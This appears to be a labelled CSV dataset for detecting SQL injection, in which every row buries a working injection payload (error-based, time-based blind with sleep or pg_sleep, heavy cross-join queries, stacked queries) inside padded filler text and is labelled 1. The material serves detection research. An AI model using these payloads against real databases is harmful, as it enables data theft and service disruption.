Query,Label
dfrbg dfrbg dfrbg dfrbg dfrbg dfrbg dfrbg dfrbg dfrbg dfrbg dfrbg dfrbg dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf ')) as jntr where 5051=5051 and (select 9067 from(select count(*) concat(0x7171706a71 (select (elt(9067=9067 1))) 0x717a767a71 floor(rand(0)*2))x from information_schema.character_sets group by x)a)--dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf dfrbgdsfdsfsdf,1
"sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh sgfdhsfdghfgfgsh union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends union with friends """""")));select count(*) from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5-- ",1
"There's a growing trend among teenagers of using frisbees as go-cart wheels.There's a growing trend among There's a growing trend among teenagers of using frisbees as go-cart wheels. "")));select (case when (8857=1512) then 8857 else 8857*(select 8857 from mysql.db) end)# There's a growing trend among teenagers of using frisbees as go-cart wheels.teenagers of using frisbees as go-cart wheels. There's a growing trend among teenagers of using frisbees as go-cart wheels. There's a growing trend among teenagers of using frisbees as go-cart wheels.There's a growing trend among teenagers of using frisbees as go-cart wheels. There's a growing trend among teenagers of using frisbees as go-cart wheels.There's a growing trend among teenagers of using frisbees as go-cart wheels. There's a growing trend among teenagers of using frisbees as go-cart wheels.There's a growing trend among teenagers of using frisbees as go-cart wheels. There's a growing trend among teenagers of using frisbees as go-cart wheels.There's a growing trend among teenagers of using frisbees as go-cart wheels. There's a growing trend among teenagers of using frisbees as go-cart wheels",1
The bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not grasp) where 1193=1193 procedure analyse(extractvalue(9255 concat(0x5c (benchmark(5000000 md5(0x52515a50))))) 1)--,1
"Three years later  the coffin was still full of Jello Three years later  the coffin was still full of Jello.Three years later  the coffin was still full of Jello Three years later Three years later  the coffin was still full of Jello Three years later Three years later  the coffin was still full of Jello Three years later the coffin was still full of Jello.Three years later  the coffin was still full of Jello Three years later  the coffin was still full of Jello.Three years later  the coffin was still full of Jello Three years later  the coffin was still full of Jello.Three years later  the coffin was still full of Jello Three years later  the coffin was still full of Jello.Three years later  the coffin was still full of Jello Three years later  the coffin was still full of Jello.Three years later  the coffin was still full of Jello Three years later  the coffin was still full of Jello.Three years later  the coffin was still full of Jello Three years later  the coffin was still full of Jello.Three years later  the coffin was still full of Jello Three years later  the coffin was still full of Jello."")) as xwrq where 4161=4161;select count(*) from sysibm.systables as t1 sysibm.systables as t2 sysibm.systables as t3--",1
"1%"") and elt(4249=4249 7259) and (""%""=The first duty of a human being is to assume the right functional relationship to society more briefly  to find your real job  and do it The first duty of a human being is to assume the right functional relationship to society more briefly  to find your real job  and do it.The first duty of a human being is to assume the right functional relationship to society more briefly  to find your real job  and do it The first duty of a human being is to assume the right functional relationship to society more briefly  to find your real job  and do it.The first duty of a human being is to assume the right functional relationship to society more briefly  to find your real job  and do it The first duty of a human being is to assume the right functional relationship to society more briefly  to find your real job  and do it.The first duty of a human being is to assume the right functional relationship to society more briefly  to find your real job  and do it The first duty of a human being is to assume the right functional relationship to society more briefly  to find your real job  and do it.""",1
dapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbdda ') and elt(3114=3114 sleep(5))# pgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbddapgbgffdvbfbd,1
"'Nothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens  ) as fgne where 7207=7207;select pg_sleep(5)--"" authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silence",1
"Many people think of prosperity that concerns money only to forget that true prosperity is of the mind Many people think of prosperity that concerns money only to forget that true prosperity is of the mind.Many people think of prosperity that concerns money only to forget that true prosperity is of the mind Many people  "") as fgne where 7207=7207;select pg_sleep(5)-- think of prosperity that concerns money only to forget that true prosperity is of the mind.Many people think of prosperity that concerns money only to forget that true prosperity is of the mind Many people think of prosperity that concerns money only to forget that true prosperity is of the mind.Many people think of prosperity that concerns money only to forget that true prosperity is of the mind Many people think of prosperity that concerns money only to forget that true prosperity is of the mind.Many people think of prosperity that concerns money only to forget that true prosperity is of the mind Many people think of prosperity that concerns money only to forget that true prosperity is of the mind.Many people think of prosperity that concerns money only to forget that true prosperity is of the mind Many people think of prosperity that concerns money only to forget that true prosperity is of the mind.",1
We cannot hold a torch to light another's path without brightening our own. We cannot hold a torch to light another's path without brightening our own.We cannot hold a torch to light another's path without brightening our own. We cannot hold a torch to light another's path without brightening our own.We cannot hold a torch to light another's path without brightening our own. We cannot hold a torch to light another's path without brightening our own.We cannot hold a torch to light another's path without brightening our own. We cannot hold a torch to light another's path without brightening our own.We cannot hold a torch to light another's path without brightening our own. We cannot hold a torch to light another's path without brightening our own.We cannot hold a torch to light another's path without brightening our own. We cannot hold a torch to light another's path without brightening our own.We cannot hold a torch to light another's path without brightening our own. We cannot hold a torch to light another's path without brightening our own.' and 6969=(select 6969 from pg_sleep(5)) and 'dgvg'='dgvg,1
